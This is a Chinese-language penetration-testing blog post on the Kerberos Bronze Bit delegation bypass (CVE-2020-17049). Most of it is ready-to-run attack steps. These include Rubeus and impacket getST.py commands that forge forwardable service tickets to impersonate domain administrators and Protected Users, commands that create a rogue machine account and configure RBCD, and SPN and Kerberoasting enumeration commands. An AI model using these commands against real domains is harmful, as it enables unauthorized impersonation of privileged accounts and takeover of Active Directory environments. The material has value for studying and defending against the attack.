---
title: 攻击方式 - Kerberos Bronze Bit
date: 2026-08-30 16:00:00
categories:
  - 渗透测试
tags:
  - Kerberos
  - Bronze Bit
  - 域渗透
description: Kerberos Bronze Bit 委派绕过漏洞原理与利用
---

**定义:**

Kerberos Bronze Bit攻击（CVE-2020-17049）是针对Kerberos协议中约束委派与基于资源的约束委派（RBCD）的一种安全功能绕过漏洞。它允许攻击者篡改服务票据（ST）的Forwardable标志位，从而突破"敏感账户禁止被委派"等安全限制。

**核心原理：**

![](/img/yuque-kerberos.png)

在Kerberos约束委派中，如果目标用户被标记为"不能被委派"或属于Protected Users组，KDC会签发不可转发的ST（Forwardable=0），阻止S4U2Proxy获取其他服务票据。 

漏洞在于：ST是用服务密钥加密的，Forwardable标志位不在PAC中，服务端可自行解密ST、修改该标志为1，再重新加密并提交给KDC。由于KDC无法检测该位是否被篡改，攻击者即可绕过限制，继续发起S4U2Proxy请求获取任意服务的ST。

### 攻击条件：
 1. 拥有服务账户的密码哈希  

 2. 该服务配置了 **约束委派 / RBCD委派**

>  服务账户哈希的获取方式：**Kerberoasting、DCSync、创建机器账户（Powermad）等**。  
>

### 实战场景：
场景 1：绕过 "敏感账户不能被委派"

+ 目标：拿下域管账号，但域管属于 Protected Users 组，不能被委派
+ 利用：Bronze Bit 修改 Forwardable 标志位，绕过限制
+ 结果：可以冒充域管访问目标服务

场景 2：绕过 "仅使用 Kerberos" 限制

+ 配置：服务被设置为 "仅使用 Kerberos"（没有 TrustedToAuthForDelegation 权限）
+ 正常：无法使用协议转换（S4U2Self + S4U2Proxy）
+ 利用：Bronze Bit 可以绕过这个限制，实现协议转换

场景 3：RBCD 场景下绕过敏感账户限制

+ 配置：有 RBCD 权限，但目标用户是敏感账户不能被委派
+ 利用：Bronze Bit 修改标志位，绕过限制

### 攻击过程：
#### 约束性委派攻击绕过
##### 工具1： Rubeus（最常用）
```sql
# 完整的 Bronze Bit 攻击命令
Rubeus.exe s4u /user:服务账户 /rc4:服务账户NTLM哈希 /domain:域名 /dc:域控IP /impersonateuser:要冒充的用户 /msdsspn:目标服务SPN /bronzebit /ptt

# 注入票据后直接访问共享
dir \\fileserver.test.com\c$
```

###### 目标服务SPN：`服务类型/主机名:端口`
**SPN（Service Principal Name，服务主体名称）** = 服务在 Kerberos 里的 "身份证"。

简单说：**你要访问哪个服务，就要用哪个服务的 SPN 去申请票据。**

| 服务 | SPN 示例 | 用途 |
| --- | --- | --- |
| CIFS | `cifs/fileserver.test.com` | 文件共享、SMB |
| HTTP | `http/web.test.com` | Web 服务 |
| MSSQL | `MSSQLSvc/sql.test.com:1433` | SQL Server |
| LDAP | `ldap/dc01.test.com` | 域控 LDAP |
| HOST | `host/pc01.test.com` | 主机服务（WMI、WinRM 等） |
| RPCSS | `rpcss/dc01.test.com` | RPC 服务 |
| WSMAN | `WSMAN/pc01.test.com` | WinRM / PowerShell 远程 |


###### 怎么拿目标服务的 SPN？
方法 1：setspn（系统自带，最简单）

cmd:

```plain
:: 查指定主机的所有 SPN
setspn -L 主机名

:: 查整个域的所有 SPN
setspn -Q */*
```

方法 2：PowerView（最常用）

```plain
# 查指定主机的 SPN
Get-DomainComputer -Identity 主机名 -Properties serviceprincipalname

# 查所有有 SPN 的账户（Kerberoasting 用）
Get-DomainUser -SPN
Get-DomainComputer -SPN
```

方法 3：Rubeus（域渗透神器）

```plain
# 查所有用户的 SPN
Rubeus.exe kerberoast /stats

# 查指定用户的 SPN
Rubeus.exe kerberoast /user:用户名
```

方法 4：BloodHound

直接在图里点目标机器，看 `Owned` 属性里的 `serviceprincipalname`。

##### 工具2：getST.py加 -force-forwardable参数
```sql
python3 getST.py -force-forwardable -spn 目标服务SPN -impersonate 要冒充的用户 域名/服务账户:密码 -dc-ip 域控IP

# 设置票据环境变量
export KRB5CCNAME=administrator.ccache

# 用票据访问目标服务
例：smbclient //fileserver.test.com/c$ -k -no-pass
```

#### 基于资源的约束性委派攻击（RBCD）绕过
##### 工具1：Rubeus
```plain
# 创建机器账户 + 配置 RBCD + Bronze Bit 一把梭
# 前提：已经有修改目标机器属性的权限

# 第1步：创建机器账户（Powermad）
New-MachineAccount -MachineAccount "EvilPC$" -Password $(ConvertTo-SecureString "Pass123!" -AsPlainText -Force)

# 第2步：配置 RBCD（把机器账户加到目标机器的允许委派列表）
Set-DomainRBCD -Identity "TargetPC$" -AllowedIdentity "EvilPC$"

# 第3步：Bronze Bit 攻击，冒充域管拿目标机器的 CIFS 票据
Rubeus.exe s4u /user:服务账户 /rc4:服务账户NTLM哈希 /domain:域名 /dc:域控IP /impersonateuser:要冒充的用户 /msdsspn:目标服务SPN /bronzebit /ptt
```

##### 工具2：getST.py+rbcd.py+addcomputer.py
```plain
# 第1步：创建机器账户（用 impacket 的 addcomputer.py）
python3 addcomputer.py test.com/普通用户:密码 -computer-name EvilPC -computer-pass Pass123! -dc-ip 10.0.0.1

# 第2步：配置 RBCD（用 rbcd.py）
python3 rbcd.py test.com/普通用户:密码 -f EvilPC$ -t TargetPC$ -dc-ip 10.0.0.1

# 第3步：Bronze Bit 攻击
python3 getST.py -force-forwardable -spn 目标服务SPN -impersonate 要冒充的用户 域名/服务账户:密码 -dc-ip 域控IP
或者：
python3 getST.py -force-forwardable -spn cifs/targetpc.test.com -impersonate administrator -hashes :机器账户NTLM哈希 test.com/EvilPC$ -dc-ip 10.0.0.1
```

---

#### 正常 RBCD vs Bronze Bit 绕过
| 对比项 | 正常 RBCD | RBCD + Bronze Bit |
| --- | --- | --- |
| **能冒充普通用户** | ✅ 可以 | ✅ 可以 |
| **能冒充敏感账户** | ❌ 不行 | ✅ 可以 |
| **能冒充 Protected Users** | ❌ 不行 | ✅ 可以 |
| **能冒充域管** | ❌ 不行（域管默认敏感） | ✅ 可以 |
| **需要的权限** | 修改目标机器 RBCD 属性 | 一样 |
| **需要的额外东西** | 无 | 机器账户的哈希（本来就有） |
